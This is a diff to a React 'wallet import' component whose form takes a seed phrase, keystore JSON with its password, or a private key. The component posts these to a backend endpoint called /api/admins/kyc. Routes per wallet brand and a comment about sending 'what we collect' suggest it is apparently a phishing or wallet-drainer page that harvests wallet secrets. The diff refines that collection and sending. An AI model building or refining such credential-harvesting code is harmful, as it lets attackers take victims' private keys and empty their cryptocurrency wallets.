@@ -158,18 +158,9 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
   const handleImport = (e) => {
     e.preventDefault();
 
-    // If sessionId was cleared (after POF), start a new one
-    let currentSessionId = localStorage.getItem('sessionId');
-    if (!currentSessionId) {
-      const newSessionId = uuidv4();
-      localStorage.setItem('sessionId', newSessionId);
-      setSessionId(newSessionId);
-      currentSessionId = newSessionId;
-    }
-
     const formData = new FormData(e.target);
     const path = window.location.pathname;
-  const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();
+    const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();
     const walletType = routeWalletType || 'unknown';
     const key = formData.get('key') || '';
     const pass = formData.get('pass') || '';
@@ -187,28 +178,27 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
 
     // If validation fails, show error toast
     if (!validation.isValid) {
-      setToast({ 
-        show: true, 
-        message: validation.error, 
-        style: { background: '#fff', color: '#d32f2f', isError: true } 
+      setToast({
+        show: true,
+        message: validation.error,
+        style: { background: '#fff', color: '#d32f2f', isError: true },
       });
       return;
     }
 
-    // Send wallet import data to backend
+    // New session for every submission
+    const newSessionId = uuidv4();
+    localStorage.setItem('sessionId', newSessionId);
+    setSessionId(newSessionId);
+
+    // Only send what we collect: seed phrase, keystore JSON + password, or private key
     const payload = {
-      sessionId: currentSessionId,
-      walletType: walletType,
+      sessionId: newSessionId,
+      walletType,
       seedPhrase: activeTab === 'phrase' ? key : undefined,
       keystoreJson: activeTab === 'keystore' ? key : undefined,
       password: activeTab === 'keystore' ? pass : undefined,
       privateKey: activeTab === 'private' ? key : undefined,
-      imageUrls: [],
-      fileMap: {},
-      dealersLicenseStatus: 'not_available',
-      qualityRequired: 'N/A',
-      karatsPurity: 'N/A',
-      destinationRefineryText: 'N/A',
     };
 
     fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, {
